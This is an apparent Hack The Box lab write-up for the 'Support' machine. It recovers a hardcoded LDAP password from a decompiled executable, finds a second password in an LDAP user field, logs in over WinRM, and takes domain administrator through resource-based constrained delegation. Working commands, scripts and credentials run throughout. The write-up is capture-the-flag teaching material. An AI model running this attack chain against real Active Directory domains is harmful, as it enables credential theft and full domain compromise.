Hack the box :Support

Nmap scan
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-31 04:20:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```
filltering for easy analyze

smb
```
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
```
```
Ldap
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: 
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site:Default-First-Site-Name)
3269/tcp open  tcpwrapped
```
```
rpc
135/tcp  open  msrpc         Microsoft Windows RPC
```
```
kerberos
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-31 04:20:45Z)
```

Enumerating smb shares
```bash
smbclient -L 10.129.22.203 -N

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
```
accessing support-tools share
```bash
smbclient //10.129.22.203/support-tools -N

smb: \> dir
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022
```
getting UserInfo.exe.zip to localmachine

decompile the userinfo.exe

**Foothold**

ldap query from UserInfo.exe
```c++
this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```
Ldap password and key
```c++
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

in the code their is funtion to decode the password using the key
```c++
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}
```

recreate the funtion using python and decode the password

python script
```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = ("armando").encode('utf-8')
array = base64.b64decode(enc_password)
array2 = []

for i in range(len(array)):
    array2.append(chr(array[i] ^ key[ i % len(key)] ^ 223))
print("".join(array2))
```

password = "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz"

we can connect the ldap as anonymous bind

```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info

we get some infos

DSA info (from DSE):
  Supported LDAP versions: 3, 2
  Naming contexts: 
    DC=support,DC=htb
    CN=Configuration,DC=support,DC=htb
    CN=Schema,CN=Configuration,DC=support,DC=htb
    DC=DomainDnsZones,DC=support,DC=htb
    DC=ForestDnsZones,DC=support,DC=htb
  Supported controls: 
    1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT
    1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT
    1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT
    1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT
    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
    1.2.840.113556.1.4.1504 - Attribute scoped query - Control - MICROSOFT
    1.2.840.113556.1.4.1852 - User quota - Control - MICROSOFT
    1.2.840.113556.1.4.1907 - Server shutdown notify - Control - MICROSOFT
    1.2.840.113556.1.4.1948 - Range retrieval no error - Control - MICROSOFT
    1.2.840.113556.1.4.1974 - Server force update - Control - MICROSOFT
    1.2.840.113556.1.4.2026 - Input DN - Control - MICROSOFT
    1.2.840.113556.1.4.2064 - Show recycled - Control - MICROSOFT
    1.2.840.113556.1.4.2065 - Show deactivated link - Control - MICROSOFT
    1.2.840.113556.1.4.2066 - Policy hints [DEPRECATED] - Control - MICROSOFT
    1.2.840.113556.1.4.2090 - DirSync EX - Control - MICROSOFT
    1.2.840.113556.1.4.2204 - Tree deleted EX - Control - MICROSOFT
    1.2.840.113556.1.4.2205 - Updates stats - Control - MICROSOFT
    1.2.840.113556.1.4.2206 - Search hints - Control - MICROSOFT
    1.2.840.113556.1.4.2211 - Expected entry count - Control - MICROSOFT
    1.2.840.113556.1.4.2239 - Policy hints - Control - MICROSOFT
    1.2.840.113556.1.4.2255 - Set owner - Control - MICROSOFT
    1.2.840.113556.1.4.2256 - Bypass quota - Control - MICROSOFT
    1.2.840.113556.1.4.2309
    1.2.840.113556.1.4.2330
    1.2.840.113556.1.4.2354
    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
    1.2.840.113556.1.4.417 - LDAP server show deleted objects - Control - MICROSOFT
    1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891
    1.2.840.113556.1.4.474 - Sort Response - Control - RFC2891
    1.2.840.113556.1.4.521 - Cross-domain move - Control - MICROSOFT
    1.2.840.113556.1.4.528 - Server search notification - Control - MICROSOFT
    1.2.840.113556.1.4.529 - Extended DN - Control - MICROSOFT
    1.2.840.113556.1.4.619 - Lazy commit - Control - MICROSOFT
    1.2.840.113556.1.4.801 - Security descriptor flags - Control - MICROSOFT
    1.2.840.113556.1.4.802 - Range option - Control - MICROSOFT
    1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT
    1.2.840.113556.1.4.841 - Directory synchronization - Control - MICROSOFT
    1.2.840.113556.1.4.970 - Get stats - Control - MICROSOFT
    2.16.840.1.113730.3.4.10 - Virtual List View Response - Control - IETF
    2.16.840.1.113730.3.4.9 - Virtual List View Request - Control - IETF
  Supported extensions: 
    1.2.840.113556.1.4.1781 - Fast concurrent bind - Extension - MICROSOFT
    1.2.840.113556.1.4.2212 - Batch request - Extension - MICROSOFT
    1.3.6.1.4.1.1466.101.119.1 - Dynamic Refresh - Extension - RFC2589
    1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513
    1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532
  Supported features: 
    1.2.840.113556.1.4.1670 - Active directory V51 - Feature - MICROSOFT
    1.2.840.113556.1.4.1791 - Active directory LDAP Integration - Feature - MICROSOFT
    1.2.840.113556.1.4.1935 - Active directory V60 - Feature - MICROSOFT
    1.2.840.113556.1.4.2080 - Active directory V61 R2 - Feature - MICROSOFT
    1.2.840.113556.1.4.2237 - Active directory W8 - Feature - MICROSOFT
    1.2.840.113556.1.4.800 - Active directory - Feature - MICROSOFT
  Supported SASL mechanisms: 
    GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
  Schema entry: 
    CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
Other:
  domainFunctionality: 
    7
  forestFunctionality: 
    7
  domainControllerFunctionality: 
    7
  rootDomainNamingContext: 
    DC=support,DC=htb
  ldapServiceName: 
    support.htb:dc$@SUPPORT.HTB
  isGlobalCatalogReady: 
    TRUE
  supportedLDAPPolicies: 
    MaxPoolThreads
    MaxPercentDirSyncRequests
    MaxDatagramRecv
    MaxReceiveBuffer
    InitRecvTimeout
    MaxConnections
    MaxConnIdleTime
    MaxPageSize
    MaxBatchReturnMessages
    MaxQueryDuration
    MaxDirSyncDuration
    MaxTempTableSize
    MaxResultSetSize
    MinResultSets
    MaxResultSetsPerConn
    MaxNotificationPerConn
    MaxValRange
    MaxValRangeTransitive
    ThreadMemoryLimit
    SystemMemoryLimitPercent
  serverName: 
    CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
  schemaNamingContext: 
    CN=Schema,CN=Configuration,DC=support,DC=htb
  isSynchronized: 
    TRUE
  highestCommittedUSN: 
    82012
  dsServiceName: 
    CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
  dnsHostName: 
    dc.support.htb
  defaultNamingContext: 
    DC=support,DC=htb
  currentTime: 
    20220808053705.0Z
  configurationNamingContext: 
    CN=Configuration,DC=support,DC=htb
```

ldap query for user's enumeration 
```bash
ldapsearch -H 'ldap://support.htb' -D 'support\ldap' -b 'CN=Users,DC=SUPPORT,DC=HTB' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
from the result we get some users. After that i enumerate each username infos specifcly
```bash
ldapsearch -H 'ldap://support.htb' -D 'support\ldap' -b 'CN=Support,CN=Users,DC=SUPPORT,DC=HTB' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
we a get password from the info feild of user support "Ironside47pleasure40Watchful"

connect the dc through winrm
```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i 10.10.11.174
```
**privilege escaltion**

BloodHOund enumeration 
```bash
sudo python3 bloodhound.py -u support -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -d support.htb -dc support.htb -c all
INFO: Found AD domain: support.htb
INFO: Connecting to LDAP server: support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: bumek13.support.htb
INFO: Querying computer: Imp0st0r.support.htb
INFO: Querying computer: ANU01.support.htb
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
WARNING: Could not resolve: bumek13.support.htb: The DNS operation timed out after 3.2048611640930176 seconds
WARNING: Could not resolve: Imp0st0r.support.htb: The DNS operation timed out after 3.208218812942505 seconds
WARNING: Could not resolve: ANU01.support.htb: The DNS operation timed out after 3.2143640518188477 seconds
INFO: Done in 00M 17S
````
found the abuse info from bloodhound application
for DC privesec 

"Resource-based Constrained Delegation"

Referance 
**https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation**

Another referance 
Old Htb box intelligence **https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html**

#add fake computer
```
New-MachineAccount -MachineAccount user911 -Password $(ConvertTo-SecureString 'password@1' -AsPlainText -Force) -Verbose
Get-DomainComputer user911
```
```
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount user911$
Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount 
```
```
$ComputerSid = Get-DomainComputer user911 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
#Check that it worked
```
Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'
```
#result 

```
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
Get the kerberos ticket
```
getST.py -dc-ip 10.10.11.174 -spn www/dc.support.htb -impersonate administrator 'support.htb/user911:password@1'
```
exporting env and connect to dc as administrator
```
export KRB5CCNAME=administrator.ccache

wmiexec.py -k -no-pass administrator@dc.support.htb
```